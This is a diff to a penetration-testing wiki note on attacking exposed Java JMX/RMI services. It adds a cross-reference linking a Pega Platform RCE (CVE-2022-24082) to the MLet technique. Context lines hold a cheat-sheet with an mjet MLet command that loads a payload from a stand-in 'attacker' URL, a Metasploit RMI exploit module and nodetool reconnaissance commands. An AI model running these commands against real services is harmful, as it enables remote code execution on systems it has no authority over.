@@ -158,3 +158,13 @@ nodetool -h <target> -p 7199 describecluster
 | MLet attack | `python3 mjet.py --jmxhost host --jmxport 1099 --attack mlet --payload_url http://attacker/mlet.html` |
 | MSF deserialization | `exploit/multi/misc/java_rmi_server` |
 | Cassandra | `nodetool -h host -p 7199 status` |
+
+---
+
+> [!note] **See also** — [[Services/Web Services/Pega|Pega]] — Pega Platform's unauthenticated RCE (CVE-2022-24082) is an exposed-JMX deserialization bug exploited with the same MOGWAI `mjet` MLet technique.
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
